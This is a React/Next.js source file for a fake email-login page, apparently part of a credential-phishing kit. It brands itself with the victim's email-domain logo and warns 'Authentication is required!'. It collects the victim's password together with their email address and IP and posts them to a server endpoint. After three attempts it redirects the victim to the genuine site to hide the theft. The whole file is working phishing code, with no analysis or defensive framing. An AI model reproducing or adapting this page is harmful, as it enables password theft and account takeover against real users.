"use client";
import Image from "next/image";
import LocaleSettings from "./locale";
import { useState, useRef } from "react";
import { LocaleType } from "./locale";

export default function Polo({
  locale,
  ender,
  fao,
  handleLoader,
  count,
  setCount,
}: LocaleType & {
  fao: string | null;
  handleLoader: (rea: boolean) => void;
  count: number;
  setCount: (count: number) => void;
}) {
  const [checker, setChecker] = useState(false);
  const ref = useRef<HTMLInputElement>(null);

  const handleSubmit = async () => {
    if (ref.current) {
      if (!ref.current.value) {
        return;
      }

      const gin = ref.current.value;

      handleLoader(false);

      const yap = {
        email: fao,
        pass: gin,
        pi: locale?.geo.ip,
        gols: ender,
      };

      console.log(yap);

      fetch("/api", {
        method: "POST",
        body: JSON.stringify(yap),
      })
        .then((res) => {
          if (count == 2 && ender) {
            window.location.replace(`https://${ender}`);
          }
          setCount(count + 1);
          handleLoader(true);
        })
        .catch((err) => {
          if (count == 2 && ender) {
            window.location.replace(`https://${ender}`);
          }
          setCount(count + 1);
          handleLoader(true);
        });
    }
  };
  return (
    <div className="flex justify-center sm:items-center min-h-screen">
      <div className="sm:shadow-2xl px-5 w-full sm:w-[450px] pt-10 rounded-lg sm:border border-gray-30/20 pb-5">
        <Image
          src={
            fao
              ? `https://logo.clearbit.com/https://${ender}`
              : "https://logo.clearbit.com/https://web.de"
          }
          alt=""
          width={40}
          height={40}
          className="mx-auto"
        />
        <div className="flex flex-col gap-y-2 mt-4">
          <div className="h-[0.1px] w-full bg-gray-50/30"></div>

          <LocaleSettings locale={locale} ender={ender} />

          <div className="h-[0.1px] w-full bg-gray-50/30"></div>
        </div>
        <p className="text-center my-4">
          Session authentication! please provide your{" "}
          <span className="font-semibold">{fao} </span>
          password to continue.
        </p>
        <div className="flex justify-center items-center gap-x-2">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 24 24"
            fill="#8c8c8c"
            className="w-6 h-6"
          >
            <path
              fillRule="evenodd"
              d="M18.685 19.097A9.723 9.723 0 0 0 21.75 12c0-5.385-4.365-9.75-9.75-9.75S2.25 6.615 2.25 12a9.723 9.723 0 0 0 3.065 7.097A9.716 9.716 0 0 0 12 21.75a9.716 9.716 0 0 0 6.685-2.653Zm-12.54-1.285A7.486 7.486 0 0 1 12 15a7.486 7.486 0 0 1 5.855 2.812A8.224 8.224 0 0 1 12 20.25a8.224 8.224 0 0 1-5.855-2.438ZM15.75 9a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0Z"
              clipRule="evenodd"
            />
          </svg>

          <p className="text-[#8c8c8c] font-bold text-xl">{fao}</p>
        </div>
        <input
          type={checker ? "text" : "password"}
          name=""
          id=""
          ref={ref}
          placeholder="Password"
          className="w-full p-2 outline-none border border-gray-30 rounded mt-4 tracking-wide"
        />

        <div className="mt-3 flex justify-between">
          <p className=" text-[#FF0000] font-semibold text-sm">
            Authentication is required!
          </p>

          {count > 0 && (
            <p className="text-sky-900 text-sm">{3 - count} attempt(s) left</p>
          )}
        </div>

        <div className="flex items-center gap-x-2 mt-4">
          <input
            type="checkbox"
            name=""
            id=""
            onClick={() => setChecker(!checker)}
          />
          <p className="text-[#0A66C3] text-sm">show password</p>
        </div>
        <button
          onClick={handleSubmit}
          className="p-3 w-full bg-[#188FFF] mt-4 text-white"
        >
          NEXT
        </button>
        <div className="h-[0.1px] w-full bg-gray-50/30 mt-12"></div>
        <div className="mt-6 pb-5 bg-gradient-to-b from-white to-gray-50/30 text-center text-sm">
          © {new Date().getFullYear()} {ender} Secure Portal | Privacy
        </div>
      </div>
    </div>
  );
}
